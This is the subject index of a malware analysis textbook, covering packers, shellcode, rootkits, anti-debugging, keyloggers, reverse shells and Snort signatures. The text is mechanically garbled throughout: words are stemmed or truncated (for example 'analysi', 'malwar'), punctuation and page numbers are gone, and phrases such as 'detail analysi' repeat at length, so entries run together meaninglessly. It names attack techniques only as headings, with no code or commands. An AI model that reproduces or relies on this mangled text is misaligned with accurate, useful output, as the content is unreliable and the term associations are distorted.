find base address find kerneldl memori find memori use fnstenv import function static runtim dynam link import detail analysi short answer name chang malwar detail analysi analyz exe shellcod use fnstenv view import short answer kerneldriv servic type servic kernighan brian c program languag recogn c code construct assembl keservicedescriptort function hide file ketickcount function short answer key window registri common cryptograph algorithm cryptograph algorithm common cryptograph algorithm registri window registri key initi code identifi detail analysi keyboard input potentialkeyloggerex unpack execut keylogg type malwar hash dump local remot hook detail analysi summari detail analysi detail analysi analysi detail analysi detail analysishook local remot hook indic detail analysi summari kmixersi look kernelmod code knowndll registri key dll loadord hijack krypto analyz kanal use krypto analyz detail analysi detail analysisl lab environ malwar network countermeasur label ollydbg analyz shellcod lab lab lab lab question lab lab lab lab lab lab lab lab lab lab lab lab lab lab solut lab detail analysi short answer detail analysi detail analysi short answer appli structur ida pro analyz function major function tabl summari detail analysi decrypt ae web command detail analysi short answer review final check short answer detail analysi detail analysi bit malwar lab detail analysi solut detail analysi antidebug lab detail analysi solut detail analysi antidisassembl lab web command solut web command antivirtu machin antivm techniqu lab short answer solut short answer c code construct assembl question detail analysi solut detail analysi c analysi lab detail analysi solut detail analysi covert launch techniqu lab summari solut summari data encod lab detail analysi solut detail analysisdynam analysi lab detail analysi solut detail analysi ida pro lab short answer solut short answer malwar behavior lab analyz function major function tabl solut analyz function major function tabl network signatur lab decrypt ae solut decrypt ae ollydbg lab short answer solut short answer packer lab review final check solut review final check shellcod analysi lab short answer solut short answer static analysi lab solut lab solut solut lab windbg lab appli structur ida pro solut appli structur ida pro window malwar lab detail analysi solut detail analysi last first lifo structur stack launcher type malwar malwar behavior see also covert launch techniqu ldrgetprocaddress function portabl execut file formatldrloaddl function portabl execut file format import window function ldt local descriptor tabl vulner instruct ldt regist ldtr vulner instruct lea instruct load effect address flag leaf function differ x call convent stack usag leav instruct stack left rotat rol arithmet legaci graph ida pro analyz function libdisasm disassembl librari linear disassembl lifo last first structur stack linear disassembl understand antidisassembl linear disassembl vs flowori linear disassembl link librari execut use portabl execut file format link list travers analyz link list travers link navig ida pro use window analysi linux virtual machin basic dynam tool practic listen function berkeley compat socket server client side network listen mode netcat use apatedn listentri structur find kerneldl memori analyz function major function tabl littleendian data main memori lm command windbg set breakpoint rootkit analysi practic analyz labsi windbg detail analysi ln command windbg search symbolsloaddllex memori breakpoint analyz without fulli unpack ollydbg use memori breakpoint loader download launcher see also launcher load ida pro load driver packer anatomi devic driver load driver execut ida pro packer anatomi ida pro ida pro loadlibrari function find string portabl execut file format thread target load execut identifi pack program use fnstenv pars pe export data import window function detail analysi detail analysi short answer use memori map locat dll use memori map locat dll detail analysi lab solut find last call lab solut unpack stub import load execut loadresourc function launcher import window function detail analysi short answer detail analysi loc link ida pro use link crossrefer local administr user run dll loadord hijack local descriptor tabl ldt vulner instruct local hook local remot hook local machin load buffer hostnam detail analysi local secur author subsystem servic lsass process gina intercept local user account password hash gina intercept local variabl vs global recogn c code construct assembl local uniqu identifi luid hash dump use sedebugprivilegeloc name chang ida pro enhanc disassembl lockresourc function detail analysi detail analysi log analyz shellcod userspac keylogg analysi msginadl detail analysi activ window userspac keylogg error malwar detail analysi ollydbg analyz shellcod credenti analysi msginadl logic oper arithmet logon credenti stealer rat long pointer lp type window api handl lookupprivilegevaluea function use sedebugprivileg detail analysi loopback encod algorithm simpl encod scheme loop find loop find oep manual c code find loop set breakpoint find oep manual lordp tool malwar analysi lowlevel languag level level abstract level abstract lowlevel remot hook local remot hook lowlevelkeyboardproc export potentialkeyloggerex unpack execut lowlevelmouseproc export potentialkeyloggerex unpack execut lsaenumeratelogonsess function import window function lsaextdll gina intercept lsass local secur author subsystem servic process gina intercept lsassex gina interceptionluid local uniqu identifi hash dumpingm mac address virtual machin vmware artifact machin code level abstract magic constant use krypto analyz magic number queri io commun port main function detail analysi short answer determin start short answer start analysi detail analysi main memori x architectur reverseengin main memori major function tabl look kernelmod code look kernel mode code analyz function major function tabl analyz function analyz function major function tabl find look kernelmod code malcod analyst pack tool malwar analysi malici document process explor analyz analyz malici document malloc function detail analysi malwar basic dynam analysi antiviru scan use first step find string detect packer peid sandbox drawback analyz malici window program network countermeasur repair import tabl manual winupack bit malwar detail analysi detail analysi detail analysi see also window malwar bit bit malwar analyz without unpack winupack attempt delet detail analysisdoublepack repair import tabl manual hash identifi antiviru scan use first step observ natur habitat network countermeasur pack obfusc find string run sandbox drawback safe environ run detect packer peid search evid encod detail analysi selfdelet script code detail analysi type basic dynam analysi malwar analysi malwar analysi primer goal malwar analysi type malwar structur virtual machin take snapshot combin dynam static analysi techniqu tool malwar analysi creat machin structur virtual machin danger overanalysi combin dynam static analysi techniqu gener rule type malwar goal malwar analysi primer risk use vmware take snapshot techniqu goal malwar analysi see also dynam analysi static analysi tool tool malwar analysi malwar behavior malwar behavior malwar behavior download launcher netcat revers shell rat rat gina intercept gina intercept hash dump identifi keylogg string list identifi keylogg string list svchost dll trojan system binari dll loadord hijack privileg escal use sedebugprivileg cover tracksusermod rootkit cover tracksusermod rootkit lab network countermeasur analyz function major functiont backdoor download launcher botnet rat credenti stealer rat gina intercept gina intercept hash dump gina intercept gina intercept hash dump gina intercept keystrok log hash dump download launcher malwar behavior indic network countermeasur lab lab analyz function major function tabl solut analyz function major function tabl persist identifi keylogg string list identifi keylogg string list svchost dll trojan system binari dll loadord hijack trojan system binari trojan system binari svchost dll window registri identifi keylogg string list privileg escal dll loadord hijack privileg escal sedebugprivileg privileg escal remot administr tool rat netcat revers shell usermod rootkit use sedebugprivileg cover tracksusermod rootkit cover tracksusermod rootkit iat hook cover tracksusermod rootkit inlin hook cover tracksusermod rootkit mandiant compar registri snapshot regshot entropi calcul apatedn compar registri snapshot regshotr curtain entropi calcul mangl pointer manual unpack autom unpack mapviewoffil function file system function import window function detail analysi analyz exe detail analysi mapvirtualkey function import window function mass malwar type malwar md messagedigest algorithm antiviru scan use first step media file shellcod store within nop sled memcmp function detail analysi memcpi function detail analysi memori global vs local variabl basic dll structur softwar execut breakpoint bypass vmware artifact search manual unpack winupack use fnstenv creat destroy object tool malwar analysi find driver memori windbg detail analysi address global variabl global vs local variabl alloc object creat destroy object check vmware artifact bypass vmware artifact search copi pe section detail analysi dump execut manual unpack winupack tool malwar analysi find devic driver windbg find driver memori windbg find kerneldl use fnstenv function dump softwar execut breakpoint process basic dll structurememori address operand main memori memori breakpoint ollydbg breakpoint condit breakpoint memori dump window ollydbg ollydbg interfac memori map window ollydbg ollydbg interfac memori map locat dll use memori map locat dll memori window windbg read set kernel debug memoryaccess violat common except memoryz tool malwar analysi messag box malwar creation summari messag flow window without hook inject process replac messagedigest algorithm md antiviru scan use first step metasploit dll loadord hijack use hash export name method c analysi pointer c class c analysi overload pointer microcod x architectur level abstract microsoft find string static runtim dynam link structur virtual machin structur virtual machin set hostonli network style servic except thing go wrong set breakpoint misus structur except handler import window function see also window compon object model com servic document import window function firewal set hostonli network hyperv structur virtual machinesoftwar data execut prevent dep misus structur except handler symbol set breakpoint virtual pc structur virtual machin visual studio static runtim dynam link style call convent style wide charact string find string microsoft develop network msdn find kerneldl memori microsoft sign binari verifi process explor display mime multipurpos internet mail extens standard base simpl encod scheme mmgetsystemroutineaddress function rootkit analysi practic import window function mneumon instruct main memori modulefirst function import window function modulenext function import window function modul set breakpoint detail analysi get name detail analysi list windbg set breakpoint modulo oper arithmet disassembl arithmet oper disassembl arithmet oper mov instruct flag arithmet stack layout imposs disassembl positionindepend code detail analysi posit depend positionindepend code movsb instruct rep instruct movsd instruct analyz exemovsx instruct branch msdo stub program pe file header section msdn microsoft develop network find kerneldl memori msdn onlin potentialkeyloggerex unpack execut msg keyword snort intrus detect snort msginadl gina gina intercept msvcrtdll import detail analysi mul instruct arithmet multibyt encod algorithm identifi xor loop ida pro multipurpos internet mail extens mime standard base simpl encod scheme multithread version window revers shell netcat revers shell mutant creat thread mutex basic dynam tool practic creat thread detail analysi detail analysi detail analysi detail analysi detail analysi detail analysi creat detail analysi detail analysi interprocess coordin creat thread malwar creation detail analysi malwar use detail analysi mz header pe execut detail analysisn name constant use name constant name pipe watch input detail analysi name explor dynam link function depend walker lab enhanc disassembl creat thread dll inject pars pe export data overload mangl detail analysi detail analysi convent function explor dynam link function depend walker lab file lab malici dll dll inject mutex creat thread hash export symbol resolut pars pe export data mangl c overload mangl locat chang ida pro enhanc disassembl malwar string comparison detail analysi modul get detail analysi name window ida pro use window analysi namespac file access via file access via namespac nat network address translat use malwar analysi machin attack use exist infrastructur vmware use malwar analysi machin nativ api window kernel vs user mode nativ applic nativ api navig function compon object model understand surround code nc use apatedn see netcat ncnebbett gari window nt nativ api refer nativ api nest statement disassembl arithmet oper recogn statement net start cisvc command detail analysi net start command run malwar interprocess coordin mutex summari netcat nc use apatedn download launcher tool malwar analysi detail analysi detail analysi detail analysi detail analysi examin result detail analysi output listen port detail analysi revers shell download launcher netschedulejobadd function import window function use memori map locat dll netshareenum function import window function network adapt bridg use malwar analysi machin network address translat nat use malwar analysi machin attack use exist infrastructur vmware use malwar analysi machin network countermeasur malwarefocus network signatur network filter procmon filter procmon network interfac card nic virtual vmware artifact network signatur goal malwar analysi goal malwar analysi bruteforc xor encod malwarefocus network signatur intrus detect snort identifi leverag encod step target multipl element lab detail analysi decrypt ae network signatur network signatur detail analysisanalysi network signatur attack perspect target multipl element creat detail analysi creat snort identifi leverag encod step creat xor bruteforc bruteforc xor encod emerg threat list intrus detect snort malwar infect detect goal malwar analysi gener detail analysi lab lab decrypt ae solut decrypt ae userag field network signatur network api berkeley compat socket network configur vmware configur vmware compar registri snapshot regshot server client side network understand surround code know sourc network content backdoor analysi detail analysi examin hook ollydbg analysi backdoor analysi captur traffic examin hook ollydbg fake compar registri snapshot regshot find code understand surround code hostonli configur vmware indic function detail analysi know sourc content know sourc network content server client side server client side network virtual configur vmwarenew oper use vtabl creat destroy object detail analysi nibbl transform data base nic network interfac card virtual vmware artifact pill techniqu use red pill antivm techniqu see also sldt instruct pill nonleaf function differ x call convent stack usag nonprivileg mode common except nonvirtu function vs virtual inherit function overrid nop instruct x architectur arithmet nop sequenc imposs disassembl nop sled shellcod shellcod encod nope instruct ida pro imposs disassembl nopbyt function imposs disassembl norman sandbox basic dynam analysi norton ghost malwar analysi virtual machin noscript tag malwar command short answer nspack entropi calcul nt namespac file access via namespac ntcontinu function nativ api tail jump ntcreatefil function configur window symbol rootkit analysi practic ntdlldll explor dynam link function depend walker kernel vs user mode window debugg detect find kerneldl memori ntglobalflag flag check processheap flag processheap flagntohl function memori breakpoint ntoskrnlex kernel vs user mode driver kernel code malici driver driver kernel code ntquerydirectoryfil function import window function find rootkit hide file hook function find rootkit ntqueryinformationfil function nativ api ntqueryinformationkey function nativ api ntqueryinformationprocess function window debugg detect import window function ntqueryinformationthread function nativ api ntquerysysteminform function nativ api ntreadfil function nativ api ntsetinformationprocess function import window function ntwritefil function nativ api configur window symbol null byte avoid shellcod full hello world exampl null termin find string nullpreserv singlebyt xor encod bruteforc xor encod number opcod byte option jump instruct target nxdomain option use apatednso object command windbg analyz labsi windbg objectori program c analysi objectori program pointer overload mangl pointer pointer objectori program object creat destroy c creat destroy object oep winupack see origin entri point oep officemalscann tool malwar analysi offset link ida pro use link crossrefer oleiniti function servic import window function detail analysi ollydbg debug paus execut breakpoint ollydbg ollydbg open execut ollydbg interfac rebas absolut vs rel address view thread stack breakpoint memori breakpoint load dll trace poison ivi patch patch analyz shellcod analyz shellcod bookmark lab check beingdebug flag use tl callback use except insert int pe header vulner pe header vulner identifi pack program autom unpack find oep manual winupack analyz without fulli unpack use callpop use callpop tool malwar analysi short answer detail analysi detail analysi backdoor analysi use memori map locat dll detail analysi detail analysi detail analysi detail analysi detail analysi lab solut lab solut short answer analysi lab solut justintim debugg use callpop short answer assist featur analyz shellcod breakpoint breakpointschoos debug argument detail analysi debug window paus execut breakpoint default set except use except disassembl view detail analysi examin hook detail analysi except handl trace poison ivi execut code view thread stack find function address use callpop forc code disassembl lab solut interfac open execut lab lab short answer solut short answer load dll memori breakpoint analyz without fulli unpack load malwar ollydbg detail analysi load pack execut autom unpack memori map examin dll load locat use memori map locat dll memori map window ollydbg interfac open malwar backdoor analysi outputdebugstr format string vulner pe header vulner pack program identifi pack program patch patch paus tl callback use tl callback plugin analyz shellcod check beingdebug flag prematur termin program detail analysisrebas rebas run trace option find oep manual screen captur decod detail analysi scriptabl debug bookmark shellcod analysi patch strncmp function detail analysi trace load dll view thread stack absolut vs rel address vulner insert int winupack winupack ollydump plugin autom unpack lab solut lab solut lab solut lab solut lab solut dump unpack program lab solut find oep section hop trace lab solut find oep section hop trace lab solut lab solut forc code disassembl lab solut opcod x architectur level abstract instruct open sourc sniffer monitor netcat openmutex function interprocess coordin mutex import window function analyz dll openprocess function import window function openprocesstoken function use sedebugprivileg detail analysi openscmanag function servic import window function detail analysi detail analysi short answer detail analysi analyz lab sy windbgopenservic function short answer detail analysi openssl common cryptograph algorithm operand main memori instruct enhanc disassembl format ida pro enhanc disassembl x architectur main memori instruct oper system oss backup imag malwar analysi virtual machin oper filter procmon filter procmon oper replic combin dynam static analysi techniqu oper secur opsec indic malici activ instruct arithmet logic oper x architectur arithmet ordin execut import function static runtim dynam link run malwar origin entri point oep packer anatomi tail jump rebuild import tabl import reconstructor rebuild import tabl import reconstructor use autom tool find oep winupack analyz without fulli unpack lab solut code around winupack find rebuild import tabl import reconstructor rebuild import tabl import reconstructor use autom tool find oep manual use autom tool find oep autom tool rebuild import tabl import reconstructor dll analyz without fulli unpack indic lab solutionstransf execut tail jump unpack stub packer anatomi orphan process detail analysi osr driver loader tool malwar analysi oss oper system backup imag malwar analysi virtual machin outlook express detail analysi output function trace identifi custom encod outputdebugstr function use window api import window function detail analysi overanalysi danger combin dynam static analysi techniqu overload pointerp pack dll analyz without fulli unpack pack execut examin pe file peview identifi pack program identifi pack program autom unpack manual unpack detect examin pe file peview entropi calcul identifi pack program identifi identifi pack program load ollydbg autom unpack repair import tabl manual unpack pack file detail analysi detail analysi indic detail analysi string detail analysi pack malwar find string detect packer peid detect peid detect packer peid packer packer unpack packer anatomi load execut tail jump tail jump repair import tabl manual lab review final check anatomi packer anatomi lab lab review final check solut review final check resolv import load execut tail jump tail jump tip trick common repair import tabl manual unpack illustr tail jumppacket list wireshark monitor netcat packet snif wireshark monitor netcat pack algorithm program run revers autom unpack pad charact base string identifi decod base parallel structur virtual machin parent class c inherit function overrid recogn vtabl child class function recogn vtabl parentchild relationship class inherit function overrid pars routin analyz pars routin analyz pars routin analyz analyz pars routin ida pro graph analyz pars routin passthehash attack gina intercept password check function detail analysi detail analysi test disabl detail analysi password monitor netcat short answer detail analysi get correct detail analysi snif monitor netcat patchbyt function imposs disassembl imposs disassembl patchguard kernel issu window vista window x version patch ollydbg patch payload rule option snort intrus detect snort pcre perl compat regular express notat snort take deeper look identifi leverag encod step pcre snort rule keyword take deeper look pdata section pe file pe file header sectionspdf document analyz malici document short answer detail analysi analyz process explor analyz malici document object creat detail analysi pdf dissector tool malwar analysi pdf tool tool malwar analysi pe explor view resourc section resourc hacker entropi calcul tool malwar analysi unpack plugin entropi calcul pe file format detect packer peid see portabl execut pe file format peb process environ block structur window debugg detect check beingdebug flag detail analysi document check beingdebug flag pebrows profession view resourc section resourc hacker pecompact repair import tabl manual peeknamedpip function import window function detail analysi peid detect packer peid tool malwar analysi short answer detail analysi detail analysi detect packer detect packer peid kanal output detail analysi peripher devic connect disconnect use malwar analysi machin perl compat regular express pcre notat snort take deeper look identifi leverag encod step persist window registri identifi keylogg string list identifi keylogg string list svchost dll trojan systembinari detail analysi detail analysi appinitdl detail analysi dll loadord hijack trojan system binari registri window registri trojan system binari svchost dll window registri identifi keylogg string list petit pecompact peview pe file header section tool malwar analysi short answer short answer detail analysi examin pe file pe file header section find base address short answer origin trojan version cisvcex detail analysi phantom plugin check beingdebug flag beingdebug flag processheap flag detail analysi phatbot vmware detect use red pill antivm techniqu phish target indic malici activ pic positionindepend code shellcod analysi pipe symbol snort intrus detect snort plugin detect packer peid use name constant clsid iid use com object analyz shellcod check beingdebug flag extend ida pro use name constant ollydbg analyz shellcod check beingdebug flag peid run execut detect packer peid thirdparti internet explor clsid iid use com object pointer handl vs file system functionspoison ivi softwar breakpoint softwar breakpoint standard back trace rat trace standard back trace use virtualalloc function softwar breakpoint poll userspac keylogg polymorph virtual vs nonvirtu function pop instruct stack stack layout find oep manual posit independ code call positionindepend code tail jump find oep manual popup ad recov hidden file popa instruct stack layout trojan system binari popad instruct stack layout port backdoor download launcher portabl execut pe file format detect packer peid potentialkeyloggerex unpack execut pe file header section examin pe file peview view resourc section resourc hacker ida pro rebas launcher use tl callback insert int pe header vulner load execut repair import tabl manual find kerneldl memori short answer short answer detail analysi detail analysi detail analysi tl section use tl callback detail analysi copi section memori detail analysi examin file structur short answer header vulner ollydbg insert int header section potentialkeyloggerex unpack execut view resourc section resourc hackersummari inform view resourc section resourc hacker ida pro support ida pro indic detail analysi pack execut format load execut pars export data find kerneldl memori peview examin pe file header section rebas rebas resourc hacker tool view examin pe file peview resourc section launcher short answer section header ollydbg crash pe header vulner port malwar use use apatedn positionindepend code pic shellcod analysi post method hide plain sight printf function push vs move differ x call convent stack usag differ x call convent stack usag detail analysi call compil bit processor differ x call convent stack usag call compil bit processor differ x call convent stack usag ida pro problem recogn detail analysi privileg escal dll loadord hijack privileg escal sedebugprivileg privileg escal privileg mode common except procdump winupackprocess activ filter procmon filter procmon process context except thing go wrong process environ block peb structur window debugg detect check beingdebug flag detail analysi document check beingdebug flag process explor view process process explor process explor display use verifi option use verifi option basic dynam tool practic tool malwar analysi detail analysi detail analysi compar string use verifi option depend walker use verifi option find dll inject detail analysi verifi option process explor display view process view process process explor process hacker tool malwar analysi process monitor procmon run malwar monitor process monitor monitor process monitor filter procmon filter procmon basic dynam tool practic tool malwar analysi detail analysi detail analysi x code path boot log option filter procmon display monitor process monitor filter dialog detail analysi filter monitor process monitor filter toolbar filter procmon review result basic dynam tool practic toggl event captur x code path process name filter procmon filter procmonprocess properti window string tab use verifi option process replac process explor display dll inject processfirst function dll inject apc inject import window function processnext function dll inject apc inject import window function process potentialkeyloggerex unpack execut process explor display basic dll structur basic dll structur creat thread manual unpack winupack analyz function major function tabl detail analysi detail analysi detail analysi detail analysi short answer detail analysi creat basic dll structur detail analysi dump memori manual unpack winupack dynam resolv enumer import short answer ebx regist suspend newli creat detail analysi enumer detail analysi follow run malwar basic dll structur function open manipul potentialkeyloggerex unpack execut hidden analyz function major function tabl interprocess coordin mutex creat thread properti window process explor display resum suspend detail analysi start replac detail analysi processheap flag peb structur check processheap flag procmon run malwar see process monitor procmonprogram examin pe file peview see execut prologu stack differ x call convent stack usag bit code differ x call convent stack usag function stack properti window process explor process explor display protocol attack mimick exist hide plain sight psapidl summari short answer push instruct stack stack layout push vs move trojan system binari understand antidisassembl find oep manual winupack lab solut start function disassembl find oep manual vs mov push vs move return instruct tail jump winupack pwdump gina intercept pycommand python script bookmark pycrypto cryptographi librari manual program decod function modifi base decod decrypt ae potenti pitfal decrypt ae python use idc script bookmark selfdecod tool malwar analysi detail analysi idapython use idc script program decod baseencod string selfdecod pycommand script bookmark script convert data string detail analysisq queri io commun port use red pill antivm techniqu queryperformancecount function time check import window function queryperformancecount function queueuserapc function apc inject import window functionsr radiofrequ identif rfid token gina intercept raiseexcept function clsid iid use com object misus structur except handler random function understand surround code know sourc network content random number gener seed detail analysi rat remot administr tool netcat revers shell raw data translat base simpl encod scheme rc algorithm use krypto analyz rcpt command smtp detail analysi rdata section pe file potentialkeyloggerex unpack execut rdtsc function gettickcount function rdtsc instruct time check time check read breakpoint find tail jump find oep manual readfil function file system function look kernelmod code detail analysi origin handl pass detail analysi readprocessmemori function import window function detail analysi rebas ida pro rebas ollydbg rebas receiv data code analysi understand surround code recoveri hidden file hide file recurs function analyz exe recv function berkeley compat socket server client side ofnetwork understand surround code import window function red pill antivm techniqu vulner instruct see also sidt instruct red pill refer snort rule keyword take deeper look regcreatekeyex function window bit window bit regdeletekeyex function window bit window bit regedit registri editor common registri function reggetvalu function analyz registri code practic region internet registri rir get ip address domain inform regist operand main memori registerclassex function potentialkeyloggerex unpack execut registerhotkey function potentialkeyloggerex unpack execut import window function regist reverseengin regist arithmet differ x architectur x architectur differ x architectur x architectur regist shift arithmet regist window ollydbg ollydbg interfac registri internet address get ip address domain inform registrymachin string short answer registri window analyz malici document window registri common registri function analyz registri code practic analyz registri code practic registri script reg file identifi keylogg string list appinitdl vmware artifact detail analysi search vulner instructionsanalyz code analyz registri code practic common function analyz registri code practic defin servic appinitdl persist identifi keylogg string list function string search search vulner instruct indic modif detail analysi root key common registri function script reg file registri script reg file snapshot regshot analyz malici document vmware artifact vmware artifact registri editor regedit common registri function registri filter procmon filter procmon registri key potentialkeyloggerex unpack execut sandbox drawback check ntglobalflag malwar sandbox drawback refer debugg check ntglobalflag regmon tool run malwar regopenkey function import window function regopenkeyex function analyz registri code practic registri script reg file window bit window bit detail analysi regsetvalueex function analyz registri code practic detail analysi regshot analyz malici document use inetsim tool malwar analysi detail analysi regular express identifi malwar pattern network signatur rel address vs absolut address ollydbg rebasingrel virtual address rva pe file pars pe export data releasemutex function creat thread reloc section pe file pe file header section remot administr tool rat netcat revers shell remot hook local remot hook remot machin program receiv command analyz dll remot process virtualallocex function dll inject remot shell session function detail analysi remot socket program connect detail analysi rep instruct x architectur branch rep movsx instruct commandlin option analysi replic oper combin dynam static analysi techniqu resourc extract import function short answer resourc hacker examin pe file peview tool malwar analysi detail analysi analyz labsi windbg detail analysi resourc section short answer detail analysi execut file store detail analysi load data short answer resourc short answer detail analysi import manipul short answer obfusc singlebyt xor encod detail analysi resourc manag process basic dll structur resumethread function process replac import window function ret instruct stack tail jump positionindepend code retn instruct ad miss code crossrefer ida pro lab solut return instruct tail jump push instruct winupack return pointer abus ad miss code crossrefer ida pro rev keyword snort intrus detect snort revers ip lookup get ip address domain inform revers shell download launcher revers shell analysi detail analysi analysi revers shell analysi creat detail analysi reverseengin basic dynam analysi monitor netcat level abstract x disassembl level abstract network protocol monitor netcat reverseengin environ tool malwar analysi revers cipher xor rfid radiofrequ identif token gina intercept right rotat ror arithmet rijndael algorithm short answer riprel address differ x architectur rir region internet registri get ip address domain inform ritchi denni c program languag recogn c code construct assembl robin john bypass vmware artifact search robtex get ip address domain inform rogu byte imposs disassembl rol encod algorithm identifi xor loop ida prorol instruct arithmet roman empir caesar cipher goal analyz encod algorithm root key registri window registri rootkit type malwar find driver object rootkit analysi practic use sedebugprivileg detail analysi find detail analysi interrupt rootkit analysi practic usermod rootkit use sedebugprivileg ror encod algorithm identifi xor loop ida pro ror instruct arithmet rot encod algorithm identifi xor loop ida pro rotat instruct arithmet rsrc section pe file pe file header section examin pe file peview rtlcomparememori function examin hook function rtlcreateregistrykey function import window function short answer analyz labsi windbg rtlinitunicodestr function look kernelmod code hide file rtlwriteregistryvalu function import window function short answer analyz labsi windbg rtutilsdl compar trojan clean version svchost dll rule option snort intrus detect snort run subkey run program automat common registri function run trace ollydbg standard back trace rundllex sandbox drawback sandbox drawback detail analysi detail analysisfilt process detail analysi run dll malwar sandbox drawback run process attach ollydbg open execut run servic list interprocess coordin mutex runtim link portabl execut file format rva rel virtual address pe file pars pe export data safe environ malwar analysi virtual machin see also virtual machin safeseh misus structur except handler sam secur account manag password hash local user account gina intercept samiconnect function hash dump import window function samigetprivatedata function hash dump import window function samqueryinformationus function import window function samrqueryinformationus function hash dump samsrvdll librari obtain handl hash dump sandbox basic dynam analysi tool malwar analysi sandboxi tool malwar analysi sc command detail analysi scarewar type malwar scasb instruct rep instruct scasx instruct branch scoopyng use scoopyng screen captur function detail analysi screenea function use idc script scriptabl debug ollydbg bookmark script idc extend ida plugin search jump locat set breakpoint dll loadord hijack default order load dll window xp dll loadord hijack symbol set breakpointsin ida pro jump locat section hop rebuild import tabl import reconstructor secur hash algorithm sha antiviru scan use first step secur account manag sam password hash local user account gina intercept secur descriptor privileg escal sedebugprivileg privilegeescal procedur detail analysi segment regist regist seh structur except handl clsid iid use com object misus structur except handler misus structur except handler detail analysi chain misus structur except handler misus misus structur except handler seitz justin gray hat python scriptabl debug selfdecod identifi custom encod selfdelet script code detail analysi send function berkeley compat socket server client side network understand surround code import window function detail analysi instal inlin hook detail analysi send data code analysi understand surround code server side network server client side network servicemain function short answer servic interprocess coordin mutex appinitdl detail analysi detail analysi short answer detail analysi detail analysi detail analysi detail analysisdefin registri appinitdl function creat detail analysi function indic creation short answer handl openservic function detail analysi window interprocess coordin mutex malwar creation detail analysi malwar instal detail analysi program creat detail analysi sc command inform detail analysi setcolor function use idc script setdll tool detour setfilepoint function detail analysi setfiletim function import window function setthreadcontext function process replac import window function detail analysi detail analysi setwaitabletim function detail analysi setwindowshookex function potentialkeyloggerex unpack execut userspac keylogg local remot hook thread target import window function detail analysi setwindowtext function potentialkeyloggerex unpack execut sf sign flag gener regist sfcterminatewatcherthread function import window function detail analysi sfcosdll detail analysi sgdt instruct vulner instruct use red pill antivm techniqu vmware detect use red pill antivm techniquevirtu machin vulner instruct sha secur hash algorithm antiviru scan use first step share file file access via namespac share folder take snapshot tweak set vmware tweak set shell connect pipe output detail analysi shelldll potentialkeyloggerex unpack execut shellcod nop sled bit malwar detail analysi detail analysi detail analysi detail analysi detail analysi bit version bit malwar decod alphabet encod detail analysi find nop sled hash array detail analysi locat open handl pdf detail analysi payload detail analysi write cisvcex detail analysi shellcod analysi patch shellcod analysi shellcod analysi shellcod analysi positionindepend code use fnstenv use fnstenv find kerneldl memori pars pe export data full hello world exampl shellcod encod lab short answer detail analysi dynam detail analysi encod full hello world exampl identifi execut locat positionindepend code ollydbg patch lab lab short answer solut short answersload code shellcod analysi manual symbol resolut use fnstenv use fnstenv find kerneldl memori pars pe export data find kerneldl memori use fnstenv pars pe export data find kerneldl memori use hash export name pars pe export data nop sled shellcod encod positionindepend code pic shellcod analysi shellcodelauncherex shellcod analysi use callpop short answer shellexecut function import window function detail analysi shift regist arithmet shl instruct arithmet arithmet showwindow function potentialkeyloggerex unpack execut shr instruct arithmet sid keyword snort intrus detect snort sidt instruct red pill vulner instruct use red pill antivm techniqu short answer sidt instructionr pill virtual machin vulner instruct signaturebas idss get ip address domain inform signatur goal malwar analysi see network signatur simpl cipher goal analyz encod algorithm goal analyz encod algorithm xor identifi xor loop ida pro simpl encod scheme base simpl encod scheme caesar cipher goal analyz encod algorithm encod scheme identifi xor loop ida proxor cipher xor simpl instruct x architectur flag singlebyt xor encod xor singlestep kernel vs usermod debug except execut code insert int icebp instruct insert int debugg kernel vs usermod debug except ollydbg execut code sinkhol malwarefocus network signatur size raw data examin pe file peview sizeofrawdata field pe header pe header vulner sizeofresourc function launcher detail analysi detail analysi sldt instruct pill use red pill antivm techniqu short answer str instruct vmware detect use red pill antivm techniqu sleep function use malwar sandbox userspac keylogg apc inject understand antidisassembl detail analysi detail analysi detail analysi loop detail analysi paramet detail analysi sandbox use malwar sandbox sleuth kit tsk tool malwar analysi smart card gina intercept snapshot connect disconnect peripher devic analyz malici document basic dynam tool practic detail analysi compar regshot analyz malici document basic dynamictool practic registri detail analysi virtual machin connect disconnect peripher devic snort intrus detect snort take deeper look take deeper look identifi leverag encod step analyz pars routin analyz pars routin tool malwar analysi network signatur analyz pars routin analyz pars routin creat signatur identifi leverag encod step fals posit take deeper look intrus detect intrus detect snort perl compat regular express pcre notat take deeper look signatur rule network signatur target multipl element analyz pars routin sockaddrin structur decod xor encod string detail analysi socket function berkeley compat socket server client side network understand surround code detail analysi symbol constant detail analysi socket berkeley compat socket detail analysi detail analysi berkeley compat berkeley compat socket code creat detail analysi program connect remot detail analysi softic debug softwar breakpoint breakpoint int scan lab solut ollydbg breakpointsv hardwar lab solut softwar data execut prevent softwar dep misus structur except handler softwar modifi execut debugg common except sourcelevel debugg vs assemblylevel debug spamsend malwar type malwar spearphish indic malici activ special file window api file access via namespac sprintf function annot code argument detail analysi spywar potentialkeyloggerex unpack execut ssdt system servic descriptor tabl find driver object rootkit check rootkit hook find driver object stack main memori stack stack function call global vs local variabl absolut vs rel address misus structur except handler creat destroy object differ x architectur detail analysi detail analysi address local variabl global vs local variabl exceptionhandl code misus structur except handler fix function detail analysi identifi paramet push onto detail analysi x architectur differ usag differ x architectur x architectur stack stack function call function call stack layout function call object creat creat destroy objectsview ollydbg absolut vs rel address stack overflow except thing go wrong stack pointer neg number thwart stackfram analysi stack variabl automat name enhanc disassembl stack window ollydbg ollydbg interfac stackform string decod short answer stackfram analysi thwart thwart stackfram analysi standard back trace ollydbg load dll startaddress function detail analysi startservic function servic short answer detail analysi analyz labsi windbg startservicectrldispatch function import window function detail analysi startupinfo structur creat new process netcat revers shell revers shell analysi manipul revers shell analysi startpend servic statu detail analysi static analysi goal malwar analysi basic dynam analysi basic static techniqu import function lab crash cours x disassembl take deeper look tool malwar analysi solut lab detail analysi advanc basic dynam analysi basic goal malwar analysi combin dynam analysi take deeper look depend walker tool malwar analysi exampl potentialkeyloggerex import functionslab lab solut lab solut solut lab techniqu detail analysi static ip address network signatur static librari server client side network static link portabl execut file format static unpack program autom autom unpack static valu memori main memori statu flag regist statusbreakpoint except use except stdcall call convent push vs move step ollydbg execut code steppinginto debugg singlestep steppingov debugg singlestep execut code storm worm use red pill antivm techniqu stosx instruct branch str instruct queri io commun port queri io commun port short answer sidt instructionr pill virtual machin detect queri io commun port detect vmware queri io commun port strcat function risk use full hello world exampl strcpi function risk use full hello world exampl stricmp function analyz exe string instruct branch string find string use verifi option common cryptographicalgorithm use window api detail analysi detail analysi detail analysi detail analysi short answer filenam check detail analysi detail analysi search vulner instruct detail analysi compar process explor use verifi option comparison malwar name detail analysi concaten function detail 